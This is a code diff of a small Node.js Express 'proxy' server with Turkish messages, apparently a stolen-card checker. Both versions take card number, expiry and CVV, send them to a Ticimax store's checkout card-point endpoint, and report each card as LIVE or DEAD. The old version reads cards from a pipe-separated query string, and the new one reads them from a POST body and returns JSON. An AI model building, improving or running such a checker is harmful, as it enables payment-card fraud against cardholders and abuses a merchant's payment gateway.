@@ -1,37 +1,43 @@
-const express = require('express');
-const fetch = require('node-fetch');
-const cors = require('cors');
-
+const express = require("express");
+const cors = require("cors");
+const axios = require("axios");
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(cors());
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
-app.get('/proxy', async (req, res) => {
-  const card = req.query.card;
-  if (!card) {
-    return res.send('❌ DEAD => No card provided');
+app.post("/proxy", async (req, res) => {
+  const { cc, month, year, cvv } = req.body;
+
+  if (!cc || !month || !year || !cvv) {
+    return res.status(400).json({ error: "Eksik bilgi gönderildi." });
   }
 
-  const [cc, month, year, cvv] = card.split('|');
-  const lid = '45542'; // sabit değer
-
-  const apiURL = `https://checkout-gw.prod.ticimax.net/payments/9/card-point?cc=${cc}&month=${month}&year=${year}&cvv=${cvv}&lid=${lid}`;
-
   try {
-    const response = await fetch(apiURL);
-    const data = await response.json();
+    // Gerçek API adresin buraya gelecek
+    const apiUrl = `https://checkout-gw.prod.ticimax.net/payments/9/card-point?cc=${cc}&month=${month}&year=${year}&cvv=${cvv}&lid=45542`;
 
-    if (data?.pointAmount) {
-      res.send(`✅ LIVE ➜ ${card} ➜ ✅ Approved | MAXIPUAN ${data.pointAmount} TL @HzQuarex`);
-    } else {
-      res.send(`❌ DEAD => ${card}`);
-    }
+    const response = await axios.get(apiUrl);
+
+    // Gerçek veri geldiyse:
+    res.json({
+      live: true,
+      message: "✅ Geçerli Kart | " + JSON.stringify(response.data),
+    });
   } catch (error) {
-    res.send(`❌ DEAD => ${card} => API bağlantı hatası`);
+    res.json({
+      live: false,
+      message: "❌ Geçersiz Kart veya API reddetti",
+    });
   }
 });
 
+app.get("/", (req, res) => {
+  res.send("Proxy API çalışıyor! - @HzQuarex");
+});
+
 app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+  console.log(`Sunucu çalışıyor: http://localhost:${PORT}`);
 });
